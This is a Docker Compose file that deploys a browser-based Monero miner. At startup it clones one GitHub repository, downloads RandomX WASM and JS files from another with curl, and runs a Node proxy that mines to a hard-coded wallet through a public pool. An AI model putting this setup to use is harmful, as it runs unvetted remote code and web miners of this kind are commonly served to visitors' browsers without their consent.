services:
  xmr-miner:
    image: node:18-alpine
    container_name: xmr-miner
    ports:
      - "8080:8080"
      - "8081:8081"
    environment:
      - WALLET=8ApdEka2j6CUaaNKp12H1VBi1bziZB2T9Dhju1fPzgiTC8KBLWEEddVeZnpZjg7Ni4KCENsPLfSDfh2nbMhbFqngM5wKwHE
      - POOL_HOST=pool.supportxmr.com
      - POOL_PORT=3333
      - REPO_URL=https://github.com/Dequanjae/XMR-WebMIner.git
    command: >
      sh -c 'apk add --no-cache git curl &&
      git clone --depth 1 "$REPO_URL" /tmp/repo &&
      mkdir -p /app/public /app/vendor /app/proxy &&
      cp /tmp/repo/config.js /app/config.js &&
      cp -r /tmp/repo/vendor/* /app/vendor/ &&
      cp /tmp/repo/proxy/index.js /app/proxy/index.js &&
      cp -r /tmp/repo/public/* /app/public/ &&
      rm -rf /tmp/repo &&
      if [ ! -f /app/public/randomx.wasm ]; then echo "Downloading WASM..." && curl -sL "https://github.com/aa022/RandomX-bonanza/raw/main/public/randomx.wasm" -o /app/public/randomx.wasm; fi &&
      if [ ! -f /app/public/randomx.js ]; then echo "Downloading JS..." && curl -sL "https://github.com/aa022/RandomX-bonanza/raw/main/public/randomx.js" -o /app/public/randomx.js; fi &&
      echo "Starting XMR miner..." && node /app/proxy/index.js'
    restart: unless-stopped
